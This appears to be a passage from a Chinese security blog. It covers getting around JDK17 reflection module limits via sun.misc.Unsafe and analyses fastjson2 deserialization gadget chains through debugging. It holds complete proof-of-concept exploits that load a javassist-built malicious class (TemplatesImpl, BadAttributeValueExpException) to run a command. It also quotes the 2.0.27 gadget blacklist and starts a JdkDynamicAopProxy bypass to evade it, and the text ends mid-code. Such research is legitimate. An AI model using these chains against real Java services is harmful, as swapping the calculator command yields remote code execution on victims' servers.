declaringClass)) { return true; } } // package is open to caller if (declaringModule.isOpen(pn, callerModule)) { return true; } if (throwExceptionIfDenied) { // not accessible String msg = \u0026#34;Unable to make \u0026#34;; if (this instanceof Field) msg += \u0026#34;field \u0026#34;; msg += this + \u0026#34; accessible: \u0026#34; + declaringModule + \u0026#34; does not \\\u0026#34;\u0026#34;; if (isClassPublic \u0026amp;\u0026amp; Modifier.isPublic(modifiers)) msg += \u0026#34;exports\u0026#34;; else msg += \u0026#34;opens\u0026#34;; msg += \u0026#34; \u0026#34; + pn + \u0026#34;\\\u0026#34; to \u0026#34; + callerModule; InaccessibleObjectException e = new InaccessibleObjectException(msg); if (printStackTraceWhenAccessFails()) { e.printStackTrace(System.err); } throw e; } return false; } 在代码后面部分，可以看到报错的内容，并且从参数传递来看，这里就是需要到if (throwExceptionIfDenied)判断部分前成功返回true从而退出，不然就肯定会报错退出。再看前面的代码：\n这里的getModule()方法就是获取模块的路径，如果发起类的模块和被反射类的模块是一样的，那么就直接返回true，但是重点的就是这第二个判断方式（根据后面的利用方法，），如果发起类的模块位置和Object.class的位置相同，那么就可以直接返回true。\nObject.class的如下：\n是和被反射的类相同，但是和我们发起的类模块位置不同：\n那么如何利用呢，这里就需要利用到UnSafe类，这是一个非常强大的类，可以操作内存空间，并且这个类位于sun.misc，在所有jdk版本都是可以直接反射调用的，并且其存在一个关键的方法：\n这个方法可以自动地将给定的参考值与给定对象中字段或数组元素的当前参考值进行交换。\n从参数中可以看出需要字段或数组元素的地址的偏移量,同样这个UnSafe类给出了一个获取字段的内存的偏移量的objectFieldOffset()方法：\n所以现在的思路就是通过UnSafe的这个类，来将我们的发起类的getModule()返回的结果和Object.class的结果变得一样，那么就可以成功返回true从而正常反射调用。\n故现在可以使用如下的代码来尝试将module修改成想要的值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import sun.misc.Unsafe; import java.lang.Module; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { System.out.println(\u0026#34;修改前：\u0026#34;+Main.class.getModule()); //修改中 Field field = Unsafe.class.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); field.setAccessible(true); Unsafe unsafe = (Unsafe) field.get(null); long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); Module targetModule = Object.class.getModule(); unsafe.getAndSetObject(Main.class, offset,targetModule); System.out.println(\u0026#34;修改后：\u0026#34;+Main.class.getModule()); } } /*output: 修改前：unnamed module @673bfdf3 修改后：module java.base */ 可以看到成功将当前未命名的模块改成了Object.class对应的module的模块位置，从而可以成功调用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import sun.misc.Unsafe; import java.lang.Module; import java.lang.reflect.Field; import java.lang.reflect.Method; import javassist.*; public class Main { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); CtConstructor constructor = new CtConstructor(new CtClass[]{}, cc); constructor.setBody(\u0026#34;{ try {\\n\u0026#34; + \u0026#34; Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\\n\u0026#34; + \u0026#34; } catch (Exception e) {\\n\u0026#34; + \u0026#34; System.exit(0);\\n\u0026#34; + \u0026#34; } }\u0026#34;); cc.addConstructor(constructor); byte[] classBytes = cc.toBytecode(); patchModule(Main.class); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Evil\u0026#34;, classBytes, 0, classBytes.length); clazz.newInstance(); } private static void patchModule(Class clazz) throws Exception { Field field = Unsafe.class.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); field.setAccessible(true); Unsafe unsafe = (Unsafe) field.get(null); long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); Module targetModule = Object.class.getModule(); unsafe.getAndSetObject(clazz, offset,targetModule); } } 运行成功弹出计算机。\n其实就是将当前运行的类的模块位置改得和Object.class的一样，这样就能无论反射要调用的类是什么，都能成功反射调用。\n并且Unsafe中还有很多可以利用，比如putObject()函数也可以修改，还可以直接使用jdk.internal.misc.Unsafe此路径下的Unsafe，因为sun.misc.Unsafe本质其实就是调用的这个类的方法进行的获取以及修改：\n后续遇到再说。\n参考文章：\nhttps://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B\nhttps://stoocea.github.io/post/JDK%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87.html#JDK9%E4%B9%8B%E5%90%8E%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96\nhttps://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/\nhttps://blog.csdn.net/weixin_36123300/article/details/147782120\n","date":"2025-09-07T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/","title":"JDK17下的反射绕过"},{"content":"fastjson2下的反序列化调用链分析 前言 在前面fastjson1下的反序列化调用链分析中，简单提到过fastjson2下的反序列化调用链，但是当时fastjson2的能打的版本为\u0026lt;=2.0.26。现在先来具体看看这个版本下的调试分析。\nFastjson2\u0026lt;=2.0.26调试分析 依赖版本改成如下即可：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.26\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 当时使用的poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行即可弹出计算机。\n其实主要的点还是在于调用toString()方法，直接将代码改简单些来调试分析一下流程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package org.example; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); jsonObject.toString(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 直接打断点于getOutputProperties()方法：\n调试直接成功断在这里，此时的调用栈为：\n1 2 3 4 5 6 getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) write:-1, OWG_1_3_TemplatesImpl (com.alibaba.fastjson2.writer) write:548, ObjectWriterImplMap (com.alibaba.fastjson2.writer) toJSONString:2388, JSON (com.alibaba.fastjson2) toString:1028, JSONObject (com.alibaba.fastjson) main:32, Main (org.example) 朴实无华，但是从中还是可以看到之前fastjson1分析下的一些影子，比如： 很熟悉的获取ObjectWriter相关类并调用它的write()方法来进行序列化。\n现在来跟一下具体细节，看一下对序列化类的处理逻辑。\n打断点于toString()方法：\n这里的JSONWriter的Feature是一个枚举类型的类：\n里面就有我们获取的定义在这个类中的ReferenceDetection值。\n后面发现JSONObject类在fastjson2中其实有两个：\n在前面我们都是使用的fastjson1的JSONObject来分析，两个都能弹，并且其实调试下来最终的调用方法是一样的，这里就直接调试分析fastjson2的JSONObject过程了，直接在import处将代码改成fastjson2即可。然后打断点调试，直接断于JSONObject类的toString()方法： 跟进这个JSONWriter类的of()方法： 最后也是返回了这个jsonWriter变量，现在来看看createWriteContext()的调用获取情况以及JSONWriterUTF16JDK8类的实例化情况，后续会用到类中的变量，要搞清楚对应变量的赋值以及调用，重新调试单击进入JSONFactory类的createWriteContext()方法：\n这里的defaultObjectWriterProvider是静态的直接默认的变量：\n继续跟进JSONWriter类的内部类Context类的初始化：\n也就是将features赋值为0，然后将参数传递的ObjectWriterProvider类的实例化对象赋值给了provider。\n最后返回了这个Context类，然后一直返回，回到JSONWriterUTF16JDK8类的初始化：\n继续往父类初始化：\n继续往父类看：\n初始化情况如上，这里的JSONWriter应该是一个和json序列化相关的类。在这个JSONWriter类初始化完毕后，回到其子类JSONWriterUTF16的初始化： 这里的chars需要关注，后面要提到。可以看到这里的cachedIndex为1，跟进调用的JSONFactory类的allocateCharArray()方法： 可以看到直接静态设置了几个变量，如这里非常重要的CHAR_ARRAY_CACHE，这是一个二维数组，但是并没有定义值，所以CHAR_ARRAY_CACHE[cacheIndex]的值为null，从而将这个chars值设置为8192个下表的数组，并且最后返回了这个数组。\n而后这个char数组的内容都是默认的占位符吧应该是：\n后续会提到，这里就先继续调试跟着走。\n——————\n回到JSONWriter类的of()方法，最后是返回了这个实例化的JSONWriterUTF16JDK8类： 然后应该是设置了要序列化的类：\n跟进setRootObject()方法： 效果如上，然后就是调用了JSONWriterUTF16JDK8类的write()方法来进行序列化，同样是传参传入了JSONObject类，对于这里的write()方法，关键的地方在于：\n这里调用了迭代器来获取我们存储在JSONObject中的键值对： 然后继续往后面走，可以看到序列化key的地方：\n当调用了writeString()方法后，这里的chars的值就更改了，这里的writeString()方法就不跟进了，关键点如下：\n数组的一个copy操作，将value的值copy进chars中。\n继续回到JSONWriterUTF16类的write()方法，后续就可以看到对value进行了处理：\n并且对其进行了获取Class处理并对比，如下一些class对象：\n1 2 3 4 5 6 7 String.class Integer.class Long.class Boolean.class BigDecimal.class JSONArray.class JSONObject.class 毫无疑问都不是和TemplatesImpl相关的，所以最后是到了如下代码：\n非常熟悉的代码了，就是对TemplatesImpl类进行序列化处理。\n跟进Context类的getObjectWriter()方法：\n可以看到是接收的Type和Class对象的参数，但是传参可以看出来是都传的Class类型的，其实就是因为Class类实现了Type接口而已：\n然后会调用ObjectWriterProvider类的getObjectWriter()方法：\n代码如下：\n毫无疑问当时赋值时就没有对cache作任何处理，并且这个变量是一个final初始化的一个默认的变量，故不能从cache中获取到TemplatesImpl.class的序列化处理类。后面的重点代码如下：\n前面经过一系列处理，都找不到对应的TemplatesImpl类的，这里就会创建一个序列化类用于序列化相关的类，其次可以看到当成功创建了类过后，就会调用putIfAbsent()方法以键值对的形式放进到cache中，以便后续再次序列化相关类时直接通过get()获取，最后是返回了这个objectWriter序列化类。\n跟进getCreator()方法：\n最后是会返回这个creator变量，这个变量的赋值在类的初始化阶段就完成了，这里简单提一下： 在前面关于ObjectWriterProvider类的初始化，我们是直接调用的无参构造函数：\n这里就涉及到了有关creator的赋值，调试效果如下：\n这里的JSONFactory类的常量CREATOR赋值在JSONFactory类的static语句中：\n所以会直接进入到default语句中从而给creator赋值为ObjectWriterCreatorASM类实例：\n并且将变量classloader赋值为了DynamicClassLoader类实例：\n跟进原先的DynamicClassLoader.getInstance()，就是直接获取instance：\n很符合前面ObjectWriterCreatorASM类初始化变量赋值的条件。\n回到ObjectWriterProvider类的getObjectWriter()方法：\n故会调用ObjectWriterCreatorASM类的createObjectWriter()方法，并且在成功创建后会将其以键值对的形式放入到cache中，以便后续再次调用，并且最后也是返回了创建的objectWriter。跟进ObjectWriterCreatorASM类的createObjectWriter()方法，后续比较关键的就是对于method中的getter的处理，如下代码：\n这里会先调用BeanUtils类的getters()方法，关键在于如下：\n先从methodCache中查看是否有缓存的method，没有的话就会调用getMethods()方法来获取到对应类的public方法并将其放入到methodCache中，后续对获取到的方法进行了处理，调用的for循环进行的获取来判断如上图，关键的地方在如下：\n可以看到是处理了getter方法，一般getter的长度都会大于3，所以这里的nameMatch肯定为true，然后进行了判断，就是取methodName的第四个字母进行判断，要是在a到z之间并且methodName长度为4，就赋值为false，但是从后面逻辑来看这里是需要nameMatch为true的，不然就会continue，并且从这个条件来看也是不容易满足的。\n在这里获取到对应的getter方法后，继续往后看，会获取getter方法对应的fileName：\n再然后就会创建序列化类了：\n此时的调用栈为：\n1 2 3 4 5 6 7 8 9 10 createFieldWriter:887, ObjectWriterCreator (com.alibaba.fastjson2.writer) lambda$createObjectWriter$2:377, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) accept:-1, 215219944 (com.alibaba.fastjson2.writer.ObjectWriterCreatorASM$$Lambda$14) getters:1010, BeanUtils (com.alibaba.fastjson2.util) createObjectWriter:252, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) getObjectWriter:333, ObjectWriterProvider (com.alibaba.fastjson2.writer) getObjectWriter:1603, JSONWriter$Context (com.alibaba.fastjson2) write:2246, JSONWriterUTF16 (com.alibaba.fastjson2) toString:1090, JSONObject (com.alibaba.fastjson2) main:33, Main (org.example) 继续跟进createFieldWriter的实现：\n比较关键的就是这一部分的getInitWriter()方法的调用，由于参数传递，这里的initObjectWriter为null，这段代码先试获取了方法的返回值的类型，然后跟进getInitWriter()的调用：\n就是判断返回值的Class对象是否符合上述几个Class对象，不符合的话就返回null，而返回null会让后续代码根据返回值的Class对象从而来实例化对应的writer类：\n比如我这里调试判断的就是getTransletIndex()方法，返回值为int类型，故如上图会实例化FieldWriterInt32Method类，最后将其放入到fieldWriterMap变量中：\n然而由于我们想要利用的getOutputProperties()方法的返回对象为class java.util.Properties，没有匹配的类，故直接使用的Object类型来进行的调用：\n再然后可以看到fieldWriterMap的值发生了变化：\n一切都是有规律的。\n这里需要提到一个点，这里的”fieldWriter“类的最终父类都是FieldWriter类，并且在传参时都是给这个父类的值进行赋值，在这里我们需要注意到其中存在一个变量的更替，以getOutputProperties()方法的过程为例：\n可以看到会对父类进行传参，需要注意这里的类中时自定义了一个变量，field:null，并且其他如前面提到的FieldWriterInt32Method类也是这样的，这个后续有大用，然后就是一直跟进到最顶父类的赋值：\n——\n故事的最后，我们如约获取到了对应的三个getter方法：\n然后将其转换对象赋值给了fieldWriters并在sort()代码部分进行了重新排序。\n前面讲了关于getter方法的处理，其实就是处理一下public的field，从而方便调用它的getter方法。再往后看，就是我们需要的objectWriter类的实例化了：\n可以看到定义了类名，在多次调试过程中经常出现它的名字，这里也是找到了出处，然后找了包名，这里就是为在内存中生成这个类做准备，定义了类名以及所出包的位置。再后续呢，就是往类中定义了一些方法，然后是实例化了这个类作为objectWriter并返回：\n这里的诸如genMethodWriteJSONB()方法往OWG_1_3_TemplatesImpl类中去定义方法内的代码，这里的对应情况如下：\n调用的方法 实现的OWG_1_3_TemplatesImpl类中的方法 genMethodWriteJSONB() writeJSONB() genMethodWrite() write() genMethodWriteArrayMapping() writeArrayMapping() 调试中发现其实在类中定义的这几个方法都可以调用到那几个getter方法，大致流程是差不多的，这里就讲讲write()定义的流程，同时可以搞清楚我们前面弄了这么久的fieldWriters起到了什么作用。\n跟进genMethodWrite()方法：\n可以看到定义的方法名称，直接跟进fieldWriters的处理方式：\n调用了for循环来对fieldWriters中存储的序列化类进行处理，跟进gwFieldValue()方法：\n会获取到filterWriter的fieldClass，然后进行类型判断：\n最后还是调用gwFieldValueObject()方法，跟进这个方法中的genGetObject()方法：\n关键点来了，由于赋值时fieldWriter.field肯定为null，也就是前面提到的，所以这里会将member赋值为对应的getter方法，从而顺理成章调用到visitMethodInsn()方法从而可以往OWG_1_3_TemplatesImpl类的write()方法中写入调用对应getter方法的代码，其他的fieldWriter同理，由于for循环，故流程都是这个，调用栈为：\n1 2 3 4 5 6 7 8 9 10 genGetObject:3339, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) gwFieldValueObject:1840, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) gwFieldValue:1758, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) genMethodWrite:722, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) createObjectWriter:554, ObjectWriterCreatorASM (com.alibaba.fastjson2.writer) getObjectWriter:333, ObjectWriterProvider (com.alibaba.fastjson2.writer) getObjectWriter:1603, JSONWriter$Context (com.alibaba.fastjson2) write:2246, JSONWriterUTF16 (com.alibaba.fastjson2) toString:1090, JSONObject (com.alibaba.fastjson2) main:33, Main (org.example) 再后面就可以通过调用这个类的write()方法从而调用对应序列化类的getter方法达到JSON序列化的目的：\n但是由于这一个过程是在内存中进行的，也就是没有实际的java文件落地，只能通过监听内存从而获取这个类的内容。\n这里可以使用arthas工具，我们需要将运行代码改成如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); try{ JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, templates); jsonObject.toString(); }catch (Exception e){ while(true){ } } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 众所周知在成功完成一次动态加载字节码后会报错退出，所以我们需要在这里加一个自循环从而让程序不会退出，然后运行并使用arthas工具监听即可：\n在前面我们已经知道了对应类的包名，也就可以知道它的路径，然后用工具将其反编译出来：\n1 jad com.alibaba.fastjson2.writer.OWG_1_3_TemplatesImpl 然后就可以拿到生成的类了，这里简单截取一些write()方法的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 if ((var12_11 = ((TemplatesImpl)var2_2).getOutputProperties()) == null) break block19; var14_12 = var1_1.isRefDetect(); if (!var14_12) ** GOTO lbl-1000 if (var2_2 == var12_11) { this.fieldWriter0.writeFieldName(var1_1); var1_1.writeReference(\u0026#34;..\u0026#34;); } else { var13_13 = var1_1.setPath(this.fieldWriter0, (Object)var12_11); if (var13_13 != null) { this.fieldWriter0.writeFieldName(var1_1); var1_1.writeReference(var13_13); var1_1.popPath(var12_11); } else lbl-1000: // 2 sources { this.fieldWriter0.writeFieldName(var1_1); this.fieldWriter0.getObjectWriter(var1_1, var12_11.getClass()).write(var1_1, var12_11, \u0026#34;outputProperties\u0026#34;, (Type)Properties.class, 0L); } } break block20; } if ((var8_6 \u0026amp; 16L) != 0L) { this.fieldWriter0.writeFieldName(var1_1); var1_1.writeNull(); } } var15_14 = ((TemplatesImpl)var2_2).getStylesheetDOM(); if (var15_14 == null) break block21; if (var1_1.isIgnoreNoneSerializable(var15_14)) break block22; var14_12 = var1_1.isRefDetect(); if (!var14_12) ** GOTO lbl-1000 if (var2_2 == var15_14) { this.fieldWriter1.writeFieldName(var1_1); var1_1.writeReference(\u0026#34;..\u0026#34;); } else { var13_13 = var1_1.setPath(this.fieldWriter1, (Object)var15_14); if (var13_13 != null) { this.fieldWriter1.writeFieldName(var1_1); var1_1.writeReference(var13_13); var1_1.popPath(var15_14); } else lbl-1000: // 2 sources { this.fieldWriter1.writeFieldName(var1_1); this.fieldWriter1.getObjectWriter(var1_1, var15_14.getClass()).write(var1_1, var15_14, \u0026#34;stylesheetDOM\u0026#34;, this.fieldWriter1.fieldType, 0L); } } break block22; } if ((var8_6 \u0026amp; 16L) != 0L) { this.fieldWriter1.writeFieldName(var1_1); var1_1.writeNull(); } } if ((var16_15 = ((TemplatesImpl)var2_2).getTransletIndex()) != 0 || var10_7 == false) { this.fieldWriter2.writeInt32(var1_1, var16_15); } var1_1.endObject(); 在这个部分代码中，我们可以看到调用了对应的三个getter方法，顺序是getOutputProperties() =\u0026gt; getStylesheetDOM() =\u0026gt; getTransletIndex()\n从而达到通过调用getter方法获取到对应field值的效果。\n至此，在可行版本下序列化的过程调试分析完毕。\n绕过限制再次达成攻击 那么官方在2.0.27版本下在哪些方面做了限制导致前面的链子不能执行呢，修改fastjson2的版本来探究一下：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.alibaba.fastjson2/fastjson2 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.fastjson2\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 那么在新的修复中做了哪些改变呢，再次过了一遍了流程，主要做出的改变就是在BeanUtils类的getters()方法中加了一个黑名单：\n从前面的调试分析中知道BeanUtils#getters()就是一个处理类中的method的非常关键的方法，前后流程对比可以在2.0.27版本中是多了如图的这几行代码，对传参的objectClass进行了判断，也就是对要序列化的类进行了处理，只要符合条件就直接退出了流程的继续，跟进这个ignore()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 static boolean ignore(Class objectClass) { if (objectClass == null) { return true; } String name = objectClass.getName(); switch (name) { case \u0026#34;javassist.CtNewClass\u0026#34;: case \u0026#34;javassist.CtNewNestedClass\u0026#34;: case \u0026#34;javassist.CtClass\u0026#34;: case \u0026#34;javassist.CtConstructor\u0026#34;: case \u0026#34;javassist.CtMethod\u0026#34;: case \u0026#34;org.apache.ibatis.javassist.CtNewClass\u0026#34;: case \u0026#34;org.apache.ibatis.javassist.CtClass\u0026#34;: case \u0026#34;org.apache.ibatis.javassist.CtConstructor\u0026#34;: case \u0026#34;org.apache.ibatis.javassist.CtMethod\u0026#34;: case \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;: case \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;: case \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\u0026#34;: case \u0026#34;org.apache.wicket.util.io.DeferredFileOutputStream\u0026#34;: case \u0026#34;org.apache.xalan.xsltc.trax.TemplatesImpl\u0026#34;: case \u0026#34;org.apache.xalan.xsltc.runtime.AbstractTranslet\u0026#34;: case \u0026#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl\u0026#34;: case \u0026#34;org.apache.commons.collections.functors.ChainedTransformer\u0026#34;: return true; default: break; } return false; } 很容易看出这里就是添加了一个黑名单，其中过滤了一些非常关键的如TemplatesImpl、AbstractTranslet类，由于我们传参的类为TemplatesImpl类，匹配到这里的逻辑，导致直接return退出，不会再进行后续的操作。\n但是这里还是可以通过动态代理来绕过。\nJdkDynamicAopProxy链 这里使用到的类就是JdkDynamicAopProxy类，需要有spring-aop依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aop\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 我们在jackson不稳定性绕过以及SpringAOP链中都使用到了这个类，是一个功能非常强大的类，这里主要的思路就是利用jackson解决不稳定性的方法来分析利用（个人认为fastjson2不会存在这个不稳定性，因为在成功创建了所有的fieldWriterMap后，还会调用Collections.sort()进行排序，故应该不会存在先后问题错误导致直接退出），然后这里讲讲这里的JdkDynamicAopProxy类的利用点：\n这里主要利用的是它的invoke()方法，基本构造就是最初学习时的格式：\n在这里主要的利用点就是如下代码：\n只要可控这里的target，并且控制chain为空，那么就可以调用到AopUtils类的invokeJoinpointUsingReflection方法：\n那么恰巧的是，这些参数是可控的，并且在SpringAOP链的学习中，可以知道我们需要调用AdvisedSupport类addAdvisor()方法来给其变量advisors赋值从而可以满足后续的条件从而可以让这里的chain不为空进入else语句进而继续后续链子的调用，那么在这里正如jackson那个的解决方法一样，直接默认即可让变量advisors为空从而直接让chain为空从而进入if语句，所以只需要控制targetSource.getTarget()返回值对应即可，而这里的AdvisedSupport类有好用的方法：\n直接用这里的SingletonTargetSource类即可。所以只要在代理对象调用到getOutputProperties()，就会进入到这里的invoke()方法，并且控制getTarget()返回对象为构造好的TemplatesImpl类即可。\n简单思路就是如上，并且和jackson调用链绕过的流程可以说非常像，现在我们就需要注意调用fastjson序列化时的过程了，这里我们会利用到动态代理，先来简单看一个本地demo：\n可以看到对代理类调用getClass()的结果为class com.sun.proxy.$Proxy0，并且再调用getMethods()时的结果是从接口中获取到的方法，也就是Templates.class接口类的中的方法。\n所以思路其实很清晰了，这里的proxy又不在黑名单里面，又可以获取到想利用的getter方法，又可以控制TempltesImpl类，所以简单的poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import 